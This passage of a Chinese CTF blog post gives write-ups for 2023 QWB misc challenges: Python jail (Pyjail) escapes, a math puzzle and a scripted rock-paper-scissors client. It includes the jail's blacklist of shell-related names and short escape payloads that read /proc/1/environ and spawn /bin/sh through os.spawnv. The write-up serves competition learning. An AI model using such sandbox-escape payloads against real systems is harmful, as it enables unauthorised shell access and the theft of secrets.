class="line"></span><br><span class="line">vars = blacklist_fun_callback</span><br><span class="line">attr = blacklist_fun_callback</span><br><span class="line">dir = blacklist_fun_callback</span><br><span class="line">getattr = blacklist_fun_callback</span><br><span class="line">exec = blacklist_fun_callback</span><br><span class="line">__import__ = blacklist_fun_callback</span><br><span class="line">compile = blacklist_fun_callback</span><br><span class="line">breakpoint = blacklist_fun_callback</span><br><span class="line"></span><br><span class="line">del os, subprocess, code, pty, blacklist_fun_callback</span><br><span class="line">input_code = input(&quot;Can u input your code to escape &gt; &quot;)</span><br><span class="line"></span><br><span class="line">blacklist_words = [</span><br><span class="line">    &quot;subprocess&quot;,</span><br><span class="line">    &quot;os&quot;,</span><br><span class="line">    &quot;code&quot;,</span><br><span class="line">    &quot;interact&quot;,</span><br><span class="line">    &quot;pty&quot;,</span><br><span class="line">    &quot;pdb&quot;,</span><br><span class="line">    &quot;platform&quot;,</span><br><span class="line">    &quot;importlib&quot;,</span><br><span class="line">    &quot;timeit&quot;,</span><br><span class="line">    &quot;imp&quot;, </span><br><span class="line">    &quot;commands&quot;,</span><br><span class="line">    &quot;popen&quot;,</span><br><span class="line">    &quot;load_module&quot;,</span><br><span class="line">    &quot;spawn&quot;,</span><br><span class="line">    &quot;system&quot;,</span><br><span class="line">    &quot;/bin/sh&quot;,</span><br><span class="line">    &quot;/bin/bash&quot;,</span><br><span class="line">    &quot;flag&quot;,</span><br><span class="line">    &quot;eval&quot;,</span><br><span class="line">    &quot;exec&quot;,</span><br><span class="line">    &quot;compile&quot;,</span><br><span class="line">    &quot;input&quot;,</span><br><span class="line">    &quot;vars&quot;,</span><br><span class="line">    &quot;attr&quot;,</span><br><span class="line">    &quot;dir&quot;,</span><br><span class="line">    &quot;getattr&quot;</span><br><span class="line">    &quot;__import__&quot;,</span><br><span class="line">    &quot;__builtins__&quot;,</span><br><span class="line">    &quot;__getattribute__&quot;,</span><br><span class="line">    &quot;__class__&quot;,</span><br><span class="line">    &quot;__base__&quot;,</span><br><span class="line">    &quot;__subclasses__&quot;,</span><br><span class="line">    &quot;__getitem__&quot;,</span><br><span class="line">    &quot;__self__&quot;,</span><br><span class="line">    &quot;__globals__&quot;,</span><br><span class="line">    &quot;__init__&quot;,</span><br><span class="line">    &quot;__name__&quot;,</span><br><span class="line">    &quot;__dict__&quot;,</span><br><span class="line">    &quot;._module&quot;,</span><br><span class="line">    &quot;builtins&quot;,</span><br><span class="line">    &quot;breakpoint&quot;,</span><br><span class="line">    &quot;import&quot;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">def my_filter(input_code):</span><br><span class="line">    for x in blacklist_words:</span><br><span class="line">        if x in input_code:</span><br><span class="line">            return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">while &#x27;&#123;&#x27; in input_code and &#x27;&#125;&#x27; in input_code and input_code.isascii() and my_filter(input_code) and &quot;eval&quot; not in input_code and len(input_code) &lt; 65:</span><br><span class="line">    input_code = eval(f&quot;f&#x27;&#123;input_code&#125;&#x27;&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;Player! Please obey the filter rules which I set!&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>直接打</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;a&quot;&#125;&#x27; + print(open(&#x27;/proc/1/environ&#x27;).read()) #</span><br></pre></td></tr></table></figure>
+
+<h3 id="Pyjail-It’s-myRevenge"><a href="#Pyjail-It’s-myRevenge" class="headerlink" title="Pyjail ! It’s myRevenge !!!"></a>Pyjail ! It’s myRevenge !!!</h3><p>题目源码</p>
+<p>第一步清除 blacklist，然后用 input 读入继续打</p>
+<table>
+<thead>
+<tr>
+<th><code>1 2 3 </code></th>
+<th><code>&#123;[list(globals().values())[-2].clear(),&quot;&#123;i&quot;&quot;nput()&#125;&quot;][1]&#125; &#123;[globals()[&quot;__builtins__&quot;].exec(&quot;import os&quot;),&quot;&#123;i&quot;&quot;nput()&#125;&quot;][1]&#125; &#123;[os.spawnv(0, &quot;/bin/sh&quot;, [&quot;sh&quot;]),&quot;&#123;i&quot;&quot;nput()&#125;&quot;][1]&#125; </code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h3 id="Pyjail-It’s-myAST"><a href="#Pyjail-It’s-myAST" class="headerlink" title="Pyjail ! It’s myAST !!!!"></a>Pyjail ! It’s myAST !!!!</h3><p>题目源码，远程环境为 python 3.11</p>
+<p>python 3.10 开始引入了 <code>match</code> 关键字，可以用 <code>match</code> 获取对象属性，用 unicode <code>﹍</code> 绕过下划线检测，用 <code>bytes</code> 转字符串和 <code>len</code> 构造数字绕过 ast 中的禁止常量，使用海象运算符绕过赋值，减小 payload 长度，虽然 1800 够用了 （</p>
+<h3 id="一-SpeedUp"><a href="#一-SpeedUp" class="headerlink" title="一.SpeedUp"></a>一.SpeedUp</h3><p><img src="/image-20231219005108031-1707064057755-11.png" alt="image-20231219005108031">在这个网站直接记载了2的27次方的阶乘的每一位数字之和</p>
+<p>A244060 - OEIS</p>
+<p><img src="/image-20231219005038815-1707064057755-12.png" alt="image-20231219005038815"></p>
+<p>对4495662081取个sha256即可 </p>
+<p>flag{bbdee5c548fddfc76617c562952a3a3b03d423985c095521a8661d248fad3797}</p>
+<h3 id="石头剪刀布"><a href="#石头剪刀布" class="headerlink" title="石头剪刀布"></a>石头剪刀布</h3><p>他是贝叶斯预测，然后手搓序列，每次贝叶斯的预测的应该差不多，可以看最后一次结果，然后序列中改成赢过AI的出法加入序列，按照这个规律改就可以把分数逐步上升，最后达到260分拿到flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0 - 石头，1 - 剪刀，2 - 布</span></span><br><span class="line">p = remote(<span class="string">&#x27;8.147.133.72&#x27;</span>,<span class="number">25458</span>)</span><br><span class="line"></span><br><span class="line">opponent_choice = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(opponent_choice)):</span><br><span class="line">    d = p.recv()</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(opponent_choice[i]).encode())</span><br><span class="line">    r = p.recv()</span><br><span class="line">    score = re.findall(<span class="string">r&#x27;你的分数： (.*?)\n&#x27;</span>,d.decode())</span><br><span class="line">    <span class="keyword">if</span> score != []:</span><br><span class="line">        <span class="built_in">print</span>(score[<span class="number">0</span>]+<span class="string">&#x27;/260&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.05</span>)</span><br><span class="line"></span><br><span class="line">d = p.recv()</span><br><span class="line"><span class="built_in">print</span>(d.decode())</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r = p.recv()</span><br><span class="line"><span class="built_in">print</span>(r.decode())</span><br><span class="line">score = re.findall(<span class="string">r&#x27;你的分数： (.*?)\n&#x27;</span>,d.decode())</span><br><span class="line"><span class="keyword">if</span> score != []:</span><br><span class="line">    <span class="built_in">print</span>(score[<span class="number">0</span>]+<span class="string">&#x27;/260&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(<span class="built_in">len</span>(opponent_choice))+<span class="string">&#x27;/100&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>chleynx
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://chensonghi.github.io./2023/12/27/qiangwangbei/" title="强网杯2023">https://chensonghi.github.io./2023/12/27/qiangwangbei/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/2023/" rel="tag"># 2023</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/12/25/chuhuibei/" rel="prev" title="楚慧杯">
+      <i class="fa fa-chevron-left"></i> 楚慧杯
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/01/29/my2023total/" rel="next" title="My 2023">
+      My 2023 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC"><span class="nav-number">2.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Pyjail-It%E2%80%99s-myFILTER"><span class="nav-number">2.1.</span> <span class="nav-text">Pyjail ! It’s myFILTER !!!</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pyjail-It%E2%80%99s-myRevenge"><span class="nav-number">2.2.</span> <span class="nav-text">Pyjail ! It’s myRevenge !!!</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pyjail-It%E2%80%99s-myAST"><span class="nav-number">2.3.</span> <span class="nav-text">Pyjail ! It’s myAST !!!!</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80-SpeedUp"><span class="nav-number">2.4.</span> <span class="nav-text">一.SpeedUp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%B3%E5%A4%B4%E5%89%AA%E5%88%80%E5%B8%83"><span class="nav-number">2.5.</span> <span class="nav-text">石头剪刀布</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="chleynx"
+      src="/images/ch.jpg">
+  <p class="site-author-name" itemprop="name">chleynx</p>
+  <div class="site-description" itemprop="description">不是看到希望才坚持，而是坚持了才能看到希望</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/chensonghi/chensonghi.github.io/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;chensonghi&#x2F;chensonghi.github.io&#x2F;" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/c582037" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;c582037" rel="noopener" target="_blank"><i class="codiepie fa-fw"></i>CSDN</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2023-10-8 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">chleynx</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+$(document).ready(function() {
+
+    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+    var countOffset = 20000;  // 初始化首次数据
+
+    function fixCount() {            
+       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
+        {
+            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
+            clearInterval(int);
+        }                  
+        if ($("#busuanzi_container_site_pv").css("display") != "none")
+        {
+            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
+            clearInterval(int); // 停止检测
+        }  
+    }
+       	
+});
+</script> 
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.3' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
